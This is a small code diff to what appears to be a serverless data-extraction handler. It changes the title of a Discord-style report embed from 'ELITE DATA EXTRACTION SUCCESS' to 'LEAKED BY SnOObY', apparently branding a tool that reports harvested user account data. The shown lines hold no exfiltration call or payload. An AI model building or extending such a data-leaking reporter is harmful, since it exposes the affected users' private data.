@@ -55,7 +55,7 @@ exports.handler = async (event) => {
         const u = userRes.data;
         
         const embed = {
-            title: "🚀 ELITE DATA EXTRACTION SUCCESS",
+            title: "LEAKED BY SnOObY",
             color: 0x00ff88,
             timestamp: new Date(),
             fields: [
